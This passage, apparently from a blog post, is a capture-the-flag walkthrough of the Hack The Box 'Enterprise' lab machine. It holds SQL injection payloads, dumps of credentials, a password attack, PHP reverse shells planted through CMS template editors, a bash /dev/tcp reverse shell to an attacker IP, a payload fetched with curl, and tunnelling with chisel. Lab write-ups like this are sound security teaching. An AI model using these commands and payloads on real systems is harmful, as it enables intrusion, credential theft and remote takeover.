+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 02:53:44 /2021-07-26/
+
+<span class="o">[</span>02:53:44] <span class="o">[</span>INFO] testing connection to the target URL
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+<span class="nt">---</span>
+Parameter: query <span class="o">(</span>GET<span class="o">)</span>
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace <span class="o">(</span>original value<span class="o">)</span>
+    Payload: <span class="nv">query</span><span class="o">=(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">4477</span><span class="o">=</span>4477<span class="o">)</span> THEN 1 ELSE <span class="o">(</span>SELECT 2905 UNION SELECT 3751<span class="o">)</span> END<span class="o">))</span>
+
+    Type: time-based blind
+    Title: MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
+    Payload: <span class="nv">query</span><span class="o">=</span>1 AND <span class="o">(</span>SELECT 7398 FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>LHvQ<span class="o">)</span>
+<span class="nt">---</span>
+available databases <span class="o">[</span>8]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> joomla
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> joomladb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sys
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> wordpress
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> wordpressdb
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="dumping-wordpress">Dumping wordpress</h3>
+<p>Dumping wp_users table from wordpress database:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 <span class="nt">--batch</span> <span class="nt">-dbms</span> mysql <span class="nt">--dump</span> <span class="nt">--threads</span> 10 <span class="nt">-D</span> wordpress  <span class="nt">-T</span> wp_users   
+Database: wordpress
+Table: wp_users
+<span class="o">[</span>1 entry]
++----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
+| ID | user_url | user_pass                          | user_email                   | user_login    | user_status | display_name  | user_nicename | user_registered     | user_activation_key |
++----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
+| 1  | &lt;blank&gt;  | <span class="nv">$P$BFf47EOgXrJB3ozBRZkjYcleng2Q</span>.2. | william.riker@enterprise.htb | william.riker | 0           | william.riker | william-riker | 2017-09-03 19:20:56 | &lt;blank&gt;             |
++----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Dumping wp_posts table from wordpress database where ID 66-68 contains passwords:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 <span class="nt">--batch</span> <span class="nt">--dump</span> <span class="nt">--threads</span> 10 <span class="nt">-dbms</span> mysql <span class="nt">-D</span> wordpress  <span class="nt">-T</span> wp_posts <span class="nt">-C</span> post_content <span class="nt">--where</span> <span class="s2">"ID&gt;=66 and ID&lt;=68"</span>
+
+Database: wordpress
+Table: wp_posts
+<span class="o">[</span>3 entries]
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| post_content                                                                                                                                                                 |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Needed somewhere to put some passwords quickly<span class="se">\r\n\r\n</span>ZxJyhGem4k338S2Y<span class="se">\r\n\r\n</span>enterprisencc170<span class="se">\r\n\r\n</span>u<span class="k">*</span>Z14ru0p#ttj83zS6<span class="se">\r\n\r\n</span>&amp;nbsp<span class="p">;</span><span class="se">\r\n\r\n</span>&amp;nbsp<span class="p">;</span>                         |
+| Needed somewhere to put some passwords quickly<span class="se">\r\n\r\n</span>ZxJyhGem4k338S2Y<span class="se">\r\n\r\n</span>enterprisencc170<span class="se">\r\n\r\n</span>ZD3YxfnSjezg67JZ<span class="se">\r\n\r\n</span>u<span class="k">*</span>Z14ru0p#ttj83zS6<span class="se">\r\n\r\n</span>&amp;nbsp<span class="p">;</span><span class="se">\r\n\r\n</span>&amp;nbsp<span class="p">;</span> |
+| Needed somewhere to put some passwords quickly<span class="se">\r\n\r\n</span>ZxJyhGem4k338S2Y<span class="se">\r\n\r\n</span>enterprisencc170<span class="se">\r\n\r\n</span>ZD3YxfnSjezg67JZ<span class="se">\r\n\r\n</span>u<span class="k">*</span>Z14ru0p#ttj83zS6<span class="se">\r\n\r\n</span>&amp;nbsp<span class="p">;</span><span class="se">\r\n\r\n</span>&amp;nbsp<span class="p">;</span> |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Got 4 passwords here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>enterprisencc170
+u*Z14ru0p#ttj83zS6
+ZD3YxfnSjezg67JZ
+ZxJyhGem4k338S2Y
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I’ll try that in wp-login with username <code class="language-plaintext highlighter-rouge">william.riker</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://enterprise.htb/ <span class="nt">-U</span> william.riker <span class="nt">-P</span> ./wp-post-passwords <span class="nt">--password-attack</span> wp-login
+
+<span class="o">[</span>+] Performing password attack on Wp Login against 1 user/s
+<span class="o">[</span>SUCCESS] - william.riker / u<span class="k">*</span>Z14ru0p#ttj83zS6
+Trying william.riker / ZD3YxfnSjezg67JZ Time: 00:00:00 &lt;<span class="o">===============================================================</span>                                                               <span class="o">&gt;</span> <span class="o">(</span>4 / 8<span class="o">)</span> 50.00%  ETA: ??:??:??
+<span class="o">[!]</span> Valid Combinations Found:
+    Username: william.riker, Password: u<span class="k">*</span>Z14ru0p#ttj83zS6
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>And we can login as user william.riker.</p>
+
+<h3 id="dumping-joomladb">Dumping joomladb</h3>
+<p>Listing tables using this command shows <code class="language-plaintext highlighter-rouge">edz2g_users</code> table.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 <span class="nt">--batch</span> <span class="nt">--dump</span> <span class="nt">--threads</span> 10 <span class="nt">-dbms</span> mysql <span class="nt">-D</span> joomladb <span class="nt">--tables</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Dumping <code class="language-plaintext highlighter-rouge">edz2g_users</code> table:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query<span class="o">=</span>1 <span class="nt">--batch</span> <span class="nt">--dump</span> <span class="nt">--threads</span> 10 <span class="nt">-dbms</span> mysql <span class="nt">-D</span> joomladb <span class="nt">-T</span> edz2g_users <span class="nt">-C</span> username,password
+
+Database: joomladb
+Table: edz2g_users
+<span class="o">[</span>2 entries]
++-----------------+--------------------------------------------------------------+
+| username        | password                                                     |
++-----------------+--------------------------------------------------------------+
+| Guinan          | <span class="nv">$2y$10$90gyQVv7oL6CCN8lF</span>/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
+| geordi.la.forge | <span class="nv">$2y$10$cXSgEkNQGBBUneDKXq9gU</span>.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
++-----------------+--------------------------------------------------------------+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I’m not able to crack those hashes.
+I’ll try spraying the users and passwords I collected until now to <code class="language-plaintext highlighter-rouge">http://enterprise.htb:8080/administrator/</code> which is joomla’s login page I got earlier.</p>
+
+<p><code class="language-plaintext highlighter-rouge">geordi.la.forge ZD3YxfnSjezg67JZ</code> gives redirection when fired up in burp intruder. 
+Rest give <em>“Username and password do not match or you do not have an account yet.”</em></p>
+
+<p>Now, I can login to joomla admin panel.</p>
+
+<h1 id="shell-for-wordpress-container">Shell for wordpress container</h1>
+<p>Go to Appearance -&gt; Editor -&gt; 404.php, edit and replace with your php reverse-shell.
+Go to Home, click on a post. Change it’s id to something non-existing.
+Ex. <a href="http://enterprise.htb/?p=33">enterprise.htb/?p=999</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.61 58282
+Linux b8319d86d21e 4.10.0-37-generic <span class="c">#41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux</span>
+ 08:08:02 up 1 day, 15:29,  0 <span class="nb">users</span>,  load average: 0.00, 0.25, 0.67
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+
+www-data@b8319d86d21e:/<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>This seems like a docker instance. <code class="language-plaintext highlighter-rouge">/.dockerenv</code> confirms that.</p>
+
+<p>Getting <code class="language-plaintext highlighter-rouge">wp-config.php</code> contents:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="nb">define</span><span class="p">(</span><span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span><span class="p">);</span>
+
+<span class="cd">/** MySQL database username */</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">);</span>
+
+<span class="cd">/** MySQL database password */</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'NCC-1701E'</span><span class="p">);</span>
+
+<span class="cd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'mysql'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>But MySQL server isn’t running on this box. IP for this docker box is <code class="language-plaintext highlighter-rouge">172.17.0.3</code>. SQL server is running on <code class="language-plaintext highlighter-rouge">172.17.0.2</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>ss <span class="nt">-ant</span>
+State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port
+LISTEN     0      128                       <span class="k">*</span>:80                       <span class="k">*</span>:<span class="k">*</span>
+TIME-WAIT  0      0                172.17.0.3:80             10.10.14.17:38060
+ESTAB      0      0                172.17.0.3:48116           172.17.0.2:3306
+ESTAB      0      0                172.17.0.3:80             10.10.14.17:37814
+TIME-WAIT  0      0                172.17.0.3:48262           172.17.0.2:3306
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">mysql</code> client isn’t installed on this box. Let’s pivot this box.</p>
+
+<h1 id="pivoting">Pivoting</h1>
+<p>Transfer <code class="language-plaintext highlighter-rouge">chisel</code> binary to the target.</p>
+<ol>
+  <li>Set up port forwarding 
+ <code class="language-plaintext highlighter-rouge">chisel server -p 1111 --reverse</code>	 on local/kali box, as usual.
+ <code class="language-plaintext highlighter-rouge">chisel client YOUR-LOCAL-BOX-IP:1111 R:2222:127.0.0.1:3333</code> on target box. Now anything I send to <code class="language-plaintext highlighter-rouge">localhost:2222</code> on kali will forward to <code class="language-plaintext highlighter-rouge">localhost:3333</code> on target.</li>
+  <li>There isn’t any service running at <code class="language-plaintext highlighter-rouge">3333</code> which we can access with <code class="language-plaintext highlighter-rouge">2222</code>, we will make our own service which is chisel socks proxy server on victim.
+ 	 <code class="language-plaintext highlighter-rouge">chisel server -p 3333 --socks5</code></li>
+  <li>Connect to the proxy server of course by using that <code class="language-plaintext highlighter-rouge">2222</code> port
+ to the target. That chisel socks server listening on <code class="language-plaintext highlighter-rouge">3333</code> is a way to get traffic to that port.
+ <code class="language-plaintext highlighter-rouge">chisel client localhost:2222 socks</code></li>
+  <li>Use proxychains to access the proxy server 
+ <code class="language-plaintext highlighter-rouge">echo 'socks5 127.0.0.1 1080' &gt;&gt; /etc/proxychains</code><br />
+ Chisel server at <code class="language-plaintext highlighter-rouge">1080</code> which is getting all that <code class="language-plaintext highlighter-rouge">2222</code> socks proxy client traffic which can be accessed by just: 
+ <code class="language-plaintext highlighter-rouge">proxychains command</code></li>
+</ol>
+
+<p>Let’s test if we’ve pivoted to the internal network or not by doing simple nmap scan with proxychains.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>proxychains nmap <span class="nt">-sT</span> 172.17.0.1-4 <span class="nt">--min-rate</span> 1000 <span class="nt">-F</span> <span class="nt">-sCV</span> 2&gt;/dev/null
+ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-26 14:03 IST
+
+Nmap scan report <span class="k">for </span>172.17.0.1
+Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 96 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac <span class="o">(</span>RSA<span class="o">)</span>
+|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http     Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: USS Enterprise &amp;#8211<span class="p">;</span> Ships Log
+443/tcp  open  ssl/http Apache httpd 2.4.25 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>enterprise.local/organizationName<span class="o">=</span>USS Enterprise/stateOrProvinceName<span class="o">=</span>United Federation of Planets/countryName<span class="o">=</span>UK
+| Not valid before: 2017-08-25T10:35:14
+|_Not valid after:  2017-09-24T10:35:14
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+8080/tcp open  http     Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-generator: Joomla! - Open Source Content Management
+|_http-open-proxy: Proxy might be redirecting requests
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/
+| /cli/ /components/ /includes/ /installation/ /language/
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Home
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report <span class="k">for </span>172.17.0.2
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 99 closed ports
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.7.19
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.7.19
+|   Thread ID: 344981
+|   Capabilities flags: 65535
+|   Some Capabilities: SupportsCompression, SupportsLoadDataLocal, LongPassword, Support41Auth, ConnectWithDatabase, FoundRows, ODBCClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SwitchToSSLAfterHandshake, IgnoreSigpipes, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, Speaks41ProtocolOld, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: <span class="se">\x</span>01%<span class="se">\x</span>0CR<span class="o">(</span>RC<span class="se">\x</span>05<span class="o">(</span>y<span class="se">\x</span>16<span class="o">(</span><span class="se">\x</span>163]<span class="se">\x</span>04L<span class="se">\x</span>11<span class="se">\x</span>11z
+|_  Auth Plugin Name: mysql_native_password
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+
+</span>Nmap scan report <span class="k">for </span>172.17.0.3
+Host is up <span class="o">(</span>0.33s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 99 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: USS Enterprise &amp;#8211<span class="p">;</span> Ships Log
+
+Nmap scan report <span class="k">for </span>172.17.0.4
+Host is up <span class="o">(</span>0.36s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 99 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/
+| /cli/ /components/ /includes/ /installation/ /language/
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Home
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 4 IP addresses <span class="o">(</span>4 hosts up<span class="o">)</span> scanned <span class="k">in </span>234.87 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Which means:
+<code class="language-plaintext highlighter-rouge">172.17.0.1</code> is the Host OS binded with the services other instances are running. It hosts <code class="language-plaintext highlighter-rouge">ssh</code> and <code class="language-plaintext highlighter-rouge">https</code> service by itself. (They mention Ubuntu as host, others as Debian dockers)
+<code class="language-plaintext highlighter-rouge">172.17.0.2</code> is running MySQL service.
+<code class="language-plaintext highlighter-rouge">172.17.0.3</code> is running Wordpress service at 80, same binded to host.
+<code class="language-plaintext highlighter-rouge">172.17.0.4</code> is running Joomla service at 8080 host, but really 80 at docker instance.</p>
+
+<p>I’m still not able to access MySQL server.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>proxychains mysql <span class="nt">-H</span> 172.17.0.2 <span class="nt">-uroot</span> <span class="nt">-p</span>
+ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+Enter password:
+ERROR 2002 <span class="o">(</span>HY000<span class="o">)</span>: Can<span class="s1">'t connect to local MySQL server through socket '</span>/run/mysqld/mysqld.sock<span class="s1">' (2)
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="shell-for-joomla-container">Shell for joomla container</h1>
+<p>After logging in. If we go to Extensions -&gt; Templates -&gt; Templates
+We see 2 templates installed:</p>
+
+<p><img src="/assets/img/Posts/Enterprise/enterprise-1.png" alt="enterprise-1" /></p>
+
+<p>Let’s edit any template and upload rev-shell.
+I chose “Beez3 Details and Files”, uploaded my php-reverse-shell as index.php.
+Clicked on save and preview. But got no shell.</p>
+
+<p>The above image shows that preview is disabled in options. I enabled preview in settings options above.
+Still don’t see any shell back to me.
+Let’s try doing some simple command injections:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">);</span>
+<span class="cp">?&gt;</span> 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>and that when previewed shows: <code class="language-plaintext highlighter-rouge">www-data www-data</code></p>
+
+<p>Which means it’s vulnerable to cmd-injection. <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.17/4444 0&gt;&amp;1</code> didn’t work, there’s still one workaround:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.17/4444 0&gt;&amp;1'"</span><span class="p">);</span>
+<span class="cp">?&gt;</span> 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>gives us the shell.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.61 37344
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@a7018bfdc454:/var/www/html<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Checking IP address: <code class="language-plaintext highlighter-rouge">172.17.0.4</code></p>
+
+<h1 id="www-data-shell-for-host">www-data shell for host</h1>
+<p>Running linpeas gives some interesting findings:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>+] Interesting Files Mounted
+/var/www/html/files /var/www/html/files rw,relatime - ext4 /dev/mapper/enterprise--vg-root rw,errors<span class="o">=</span>remount-ro,data<span class="o">=</span>ordered
+
+<span class="o">[</span>+] Possible Entrypoints
+root root 3.1K Aug 31  2017 /entrypoint.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Entrypoint script setups the servers running on the box, connections to mysql database and so on.
+<code class="language-plaintext highlighter-rouge">/var/www/html/files</code> is mounted from a host. Let’s make a test file and check on https server if that reflects.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>www-data@a7018bfdc454:/var/www/html/files<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Can you see me?"</span> <span class="o">&gt;</span> caretaker
+</pre></td></tr></tbody></table></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>root@TheCaretaker:~/HTB/Enterprise<span class="nv">$ </span>curl https://enterprise.htb/files/caretaker <span class="nt">-k</span>
+Can you see me?
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s try uploading a php reverse shell once again.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>www-data@a7018bfdc454:/var/www/html/files<span class="nv">$ </span>curl 10.10.14.17/phprev.php <span class="nt">-O</span> phprev.php
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Visiting <code class="language-plaintext highlighter-rouge">https://enterprise.htb/files/phprev.php</code> gives a shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.61 49542
+Linux enterprise.htb 4.10.0-37-generic <span class="c">#41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 10:57:00 up 1 day, 17:18,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1472<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@enterprise:/<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And I see only one user in home directory <code class="language-plaintext highlighter-rouge">jeanlucpicard</code>, also I can read the user flag:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>www-data@enterprise:/home/jeanlucpicard<span class="nv">$ </span><span class="nb">cat </span>user.txt
+08552d48aa6d6d9c05dd67f1b4ba8747
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="privesc-via-bof">Privesc via BOF</h1>
+<p>Enumerating for SUID files gives <code class="language-plaintext highlighter-rouge">/bin/lcars</code> binary. Which is also serving on a higher port.</p>
